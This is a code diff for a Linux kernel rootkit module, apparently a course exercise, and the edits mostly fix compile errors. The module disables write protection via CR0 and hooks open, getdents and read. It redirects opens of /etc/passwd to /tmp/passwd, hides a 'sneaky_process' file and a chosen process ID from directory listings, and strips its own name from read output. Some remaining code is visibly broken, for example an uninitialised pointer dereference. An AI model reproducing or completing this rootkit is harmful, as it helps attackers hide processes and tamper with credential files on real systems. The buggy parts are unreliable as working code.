@@ -10,8 +10,8 @@
 #include <asm/cacheflush.h>
 #include <linux/moduleparam.h>
 
-#include <stdlib.h>
-#include <string.h>
+//#include <linux/stdlib.h>
+#include <linux/string.h>
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -20,14 +20,15 @@
 #define read_cr0() (native_read_cr0())
 #define write_cr0(x) (native_write_cr0(x))
 
-char pid[40];
-module_param(pid, char, NULL, 0);
+char * pid;
+module_param(pid, charp, 0000);
 
 struct linux_dirent {
   u64            d_ino;
   s64            d_off;
   unsigned short d_reclen;
-  char           d_name[BUFFLEN];
+  char           d_name[32];
+  char           d_type;
 };
 
 //These are function pointers to the system calls that change page
@@ -55,19 +56,20 @@ asmlinkage size_t (*original_read)(int fd, void *buf, size_t count);
 asmlinkage int sneaky_sys_open(const char *pathname, int flags){
   printk(KERN_INFO "Very, very Sneaky!\n");
   if(strcmp(pathname, "/etc/passwd")==0){
-    copy_to_user(pathname, "/tmp/passwd");
+    copy_to_user(pathname, "/tmp/passwd", 12);
   }
   return original_open(pathname, flags);
 }
 
 asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, unsigned int count){
   int nread = original_getdents(fd, dirp, count);
-  int p=0;
-  struct linux_dirent * p = NULL;
-  for(int bpos=0; bpos<nread; bpos+=d->d_reclen){
+  struct linux_dirent * d;
+  struct linux_dirent * p;
+  int bpos;
+  for(bpos=0; bpos<nread; bpos+=d->d_reclen){
     d = (struct linux_dirent *) (dirp + bpos);
     if((strcmp(d->d_name, "sneaky_process") == 0 && d->d_type==DT_REG) ||
-        strcmp(d->d_name, pid) == 0 && d->d_type==DT_DIR){
+       (strcmp(d->d_name, pid) == 0 && d->d_type==DT_DIR)){
       p->d_reclen += d->d_reclen; // prev dirent will skip this dirent
     }
     p=d;
@@ -76,16 +78,17 @@ asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent * dirp, 
 }
 
 asmlinkage size_t sneaky_sys_read(int fd, void *buf, size_t count){
-  size_t nread = original_read(int fd, void *buf, size_t count);
+  size_t nread = original_read(fd, buf, count);
+  //buf = (char*) buf;
   char name[] = "sneaky_mod ";
   int i, j;
   int line_start = 1;
   int p1=0, p2=0, found=0;
-  for(i=0; i<count; ++i){
+  for(i=0; i<nread; ++i){
     if(line_start){
       line_start = 0;
       for(j=0, p1=i; i<count && j<11; ++j,++i){
-        if(buf[i] != name[j]){
+        if(*(char*)(buf+i) != *(char*)(name+j)){
           break;
         }
         if(j==10){
@@ -93,7 +96,7 @@ asmlinkage size_t sneaky_sys_read(int fd, void *buf, size_t count){
         }
       }
     }
-    if(buf[i] == '\n'){
+    if(*(char*)(buf+i) == '\n'){
       if(found){
         p2 = i+1;
         break;
@@ -102,9 +105,10 @@ asmlinkage size_t sneaky_sys_read(int fd, void *buf, size_t count){
     }
   }
   if(found){
-    strcpy(buf[p1], buf[p2]);
+    strcpy(buf+p1, buf+p2);
   }
-  return nread;
+  if(found) return nread-p2+p1;
+  else return nread;
 }
 
 //The code that gets executed when the module is loaded
